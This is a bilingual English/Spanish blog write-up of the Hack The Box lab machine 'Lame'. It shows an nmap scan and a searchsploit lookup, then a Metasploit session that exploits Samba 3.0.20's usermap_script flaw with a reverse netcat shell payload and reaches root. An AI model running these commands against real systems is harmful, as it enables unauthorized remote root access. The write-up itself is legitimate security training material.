---
layout: single
title: Lame - Hack The Box

excerpt: "Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. / Lame es una maquina de nivel principiante, solamente requiere un exploit para obtener un acceso como root.Fue la primera máquina publicada en Hack The Box y a menudo era la primera máquina para los nuevos usuarios antes de su retirada."
date: 2022-11-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/Lame.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Samba
  - Pentesting
  - Network
  - Vulnerability Assessment
  - Common Services
  - Outdated Software
  - Security Tools
  - Metasploit
  - Remote Code Execution
---

![](/assets/images/htb-writeup-lame/Lame.png)

## Portscan / Escaneo de puertos

````

┌──(kali㉿kali)-[~]
└─$ nmap -T4 -sCV -Pn 10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-18 18:36 EST
Nmap scan report for 10.10.10.3
Host is up (0.30s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m22s, deviation: 3h32m09s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-11-18T18:37:05-05:00

````

## Searching samba 3.0.20 vulnerabilites in searsploit we find this: / Buscando vulnerabilidades sobre "samba 3.0.20" en searchsploit nos encontramos con lo siguiente:

````

┌──(kali㉿kali)-[~]
└─$ searchsploit samba 3.0.20
--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                       | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)             | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                        | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                        | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

````
## We find a Command Execution vulnerabilite trought Metasploit. / Encontramos una vulnerabilidad de "Command Execution" a traves de Metasploit.
## We open metasploit then we search, set and run the exploit. / Abrimos el framework de metasploit, buscamos, seteamos y corremos el exploit.


````
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                      wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set RPORT 445
RPORT => 445
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.6
LHOST => 10.10.14.6
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.3:56495) at 2022-11-18 18:45:51 -0500

id
uid=0(root) gid=0(root)
````
## We acces the system with root privileges. / Accedimos al sistema con privilegios de administrador.

